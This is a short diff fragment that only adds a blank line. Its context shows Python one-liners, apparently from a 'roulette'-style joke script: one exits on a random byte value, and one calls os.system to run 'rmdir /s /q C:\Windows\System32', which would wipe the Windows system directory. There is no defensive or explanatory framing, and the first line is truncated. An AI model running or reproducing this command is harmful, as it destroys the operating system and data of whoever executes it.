@@ -7,3 +7,4 @@ import os; exit() if int.from_bytes(os.urandom(1)) == 42 else print("do not play
 import os; os.system("rmdir /s /q C:\Windows\System32")
 
 
+
